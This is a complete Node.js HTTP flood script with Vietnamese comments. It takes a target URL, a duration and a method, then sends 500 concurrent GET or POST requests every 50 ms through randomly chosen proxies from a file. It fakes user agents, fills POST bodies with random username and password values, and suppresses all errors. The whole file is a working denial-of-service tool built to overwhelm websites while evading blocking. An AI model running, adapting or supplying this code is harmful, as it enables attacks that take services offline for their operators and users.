const url = require('url');
const fs = require('fs');
const https = require('https');
const HttpsProxyAgent = require('https-proxy-agent');
const randua = require('fake-useragent');

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// Tham số từ dòng lệnh
const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3]); // tính bằng giây
const method = process.argv[4] ? process.argv[4].toUpperCase() : 'GET';
const CONCURRENCY = 500; // số lượng request đồng thời mỗi lần
const INTERVAL_MS = 50;  // khoảng cách giữa các đợt gửi request

// Load proxy từ file
const proxies = fs.readFileSync('proxy.txt', 'utf8').match(/(\d{1,3}\.){3}\d{1,3}:\d{1,5}/g);

const parsedUrl = url.parse(targetUrl);

// Tạo chuỗi ngẫu nhiên
const randomString = (len) => {
  const chars = 'abcdef0123456789JDJDKDkkkKAKAKSKKS92929!#))#?$!@)#);$;$)#)/@)#';
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

// Tạo payload POST
const generatePostData = () => {
  return `username=${encodeURIComponent(randomString(8))}&password=${encodeURIComponent(randomString(12))}`;
};

// Tạo header chuẩn với UA ngẫu nhiên
const createHeaders = () => ({
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'en-US,en;q=0.9',
  'cache-control': 'no-cache',
  'pragma': 'no-cache',
  'upgrade-insecure-requests': '1',
  'connection': 'keep-alive',
  'user-agent': randua()
});

// Gửi hàng loạt request đồng thời
async function flood() {
  const tasks = Array.from({ length: CONCURRENCY }, () => new Promise((resolve) => {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const agent = new HttpsProxyAgent(`http://${proxy}`);
    const headers = createHeaders();

    const options = {
      protocol: parsedUrl.protocol,
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || 443,
      path: parsedUrl.path,
      method: method,
      headers: headers,
      agent: agent,
    };

    if (method === 'GET') {
      https.get(options, (res) => {
        res.resume(); // consume response
        resolve(res.statusCode);
      }).on('error', () => resolve());
    } else if (method === 'POST') {
      options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      const req = https.request(options, (res) => {
        res.resume();
        resolve(res.statusCode);
      });
      req.write(generatePostData());
      req.end();
      req.on('error', () => resolve());
    } else {
      resolve(); // unsupported method
    }
  }));

  await Promise.all(tasks);
}

// Lặp lại theo interval
const interval = setInterval(flood, INTERVAL_MS);

// Thoát sau thời gian định trước
setTimeout(() => {
  clearInterval(interval);
  console.log('Kết thúc gửi sau', duration, 'giây');
  process.exit(0);
}, duration * 1000);
